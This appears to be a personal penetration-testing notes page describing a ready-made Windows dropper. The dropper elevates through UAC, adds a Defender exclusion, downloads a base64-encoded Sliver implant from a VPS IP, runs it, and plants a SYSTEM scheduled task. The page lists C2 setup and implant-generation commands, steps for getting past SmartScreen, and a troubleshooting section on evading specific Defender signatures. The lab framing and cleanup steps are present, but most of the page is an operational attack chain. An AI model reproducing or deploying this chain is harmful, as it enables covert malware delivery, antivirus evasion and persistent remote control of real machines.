---
title: Windows Dropper Payload
category: initial-access
created: 2026-08-13
tags: [technique, initial-access]
permalink: oscp/techniques/windows-dropper-payload
---

# Windows Dropper Payload

## What it is
- My ready-made Windows dropper: one exe you double-click on a target, and it does everything — asks for admin (UAC), tells Defender to ignore a folder, downloads my Sliver implant into that folder, runs it, and plants a scheduled task so it comes back as SYSTEM after every reboot
- Catches sessions in **Sliver** on my VPS (many at once, encrypted, self-reconnecting) — see [[Reverse Shell]] for the plain-nc version and [[Windows Persistence Flow]] for the theory

## When to use it
- You have a way to run a file on a Windows target **and the user is an admin** (the exclusion + SYSTEM task need the UAC yes)
- Lab VMs, HTB/CPTS boxes where you can drop and execute a file

## The pieces (already built, in the payloads repo)
| Piece | What it is | Where |
|---|---|---|
| `UpdateMgr.exe` | The dropper (built from `install.ps1` with PS2EXE) | repo + `http://2.25.141.57/UpdateMgr.exe` |
| `updater.exe` | Sliver implant, calls home to `2.25.141.57:443` | VPS `~/payloads` |
| `updater.b64` | base64 of the implant — what the dropper actually downloads (Defender can't signature-match a text file) | VPS `~/payloads` |
| `install.ps1` | Dropper source script | repo |

## Commands

#### 1. Start the infrastructure (VPS)
```bash
ssh jason@100.125.52.98
tmux attach -t lab      # window 0 = payload server, sliver window = C2 console
```
- If the payload server died: `cd ~/payloads && sudo python3 -m http.server 80`
- If Sliver died: `ss` (alias for `cd ~/sliver && ./sliver-server`), then inside the console: `mtls --lhost 0.0.0.0 --lport 443`
- Check the listener is up: `jobs` should show mTLS on 443

#### 2. On the Windows target
```
Browser: http://2.25.141.57/UpdateMgr.exe → download → double-click → UAC Yes
```
- Prints [1/6]–[6/6]; window waits for a keypress at the end so errors stay readable
- SmartScreen warning is normal (unknown file reputation) → More info → Keep anyway

#### 3. Catch and use the session (Sliver console)
```
sessions            # new one appears within seconds of step 5/6
use <id>
shell               # cmd/powershell on the target; Ctrl-] to escape the tunnel
background          # back to session list
```
- Reboot the target → new session appears by itself as `nt authority\system` (the scheduled task)

#### 4. Regenerate the implant (when Sliver says "unknown implant signature key" or you want a fresh one)
```
# in the Sliver console:
generate --mtls 2.25.141.57:443 --os windows --arch amd64 --format exe --save /home/jason/payloads/
```
```bash
# on the VPS (any shell):
cd ~/payloads && mv -f <RANDOM_NAME>.exe updater.exe && base64 -w0 updater.exe > updater.b64
```
- No need to rebuild the dropper — just re-run `UpdateMgr.exe` on the target and it fetches the new implant

#### 5. Rebuild the dropper (only if install.ps1 changes)
```powershell
# Windows host, in the repo folder:
Invoke-ps2exe -inputFile .\install.ps1 -outputFile .\UpdateMgr.exe -requireAdmin
git add .\UpdateMgr.exe; git commit -m "msg"; git push
```
```bash
ssh jason@100.125.52.98 'cd ~/payloads && git pull'
```

#### Cleanup on a target (elevated PowerShell)
```powershell
schtasks /delete /tn "UpdateMgr" /f
Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\UpdateMgr'
Remove-Item -Recurse -Force 'C:\ProgramData\Microsoft\UpdateMgr'
```

## Gotchas / troubleshooting
- **Never run the dropper on your own host** — it does its five jobs wherever it runs. Check `sessions` hostnames if unsure
- **Defender knows these patterns** (learned the hard way): `certutil -urlcache` downloads = `Trojan:Win32/Ceprolad.A` (command-line signature). Stock Sliver implants = `Trojan:Win32/Gracing.*` (file signature). That's why the dropper uses Invoke-WebRequest + base64 and decodes *inside* the excluded folder
- **Exclusions are per-folder** — certutil stages downloads through `INetCache`, which is NOT excluded, so the payload got scanned there. Every file the dropper touches must stay inside the exclusion
- **"unknown implant signature key" in Sliver logs** = server forgot the implant's registration (e.g. after killing sessions) → regenerate the implant (step 4)
- **Sessions are runtime state** — if Sliver restarts, the list empties, but implants keep retrying; restart the listener and they come back within a minute
- **Run servers in tmux, never bare SSH** — closing the tab kills the server (and the alias `ss` expects tmux)
- **If a step gets flagged again**: Protection history → get the exact detection name → tweak that one step → rebuild. That loop IS the skill

## Tools
- Sliver C2 (`~/sliver/sliver-server` on VPS, alias `ss`) — implant + listener + session management
- PS2EXE — wraps the PowerShell dropper as an exe (`-requireAdmin` = auto UAC prompt)
- `python3 -m http.server` — payload delivery from `~/payloads`
- tmux — keeps it all alive on the VPS

## Boxes where I used this
- [[]]

## References
- Spec + plan: `docs/superpowers/specs/2026-08-13-windows-dropper-design.md`, `docs/superpowers/plans/2026-08-13-windows-dropper-lab.md`
- [[Reverse Shell]], [[Windows Persistence Flow]]
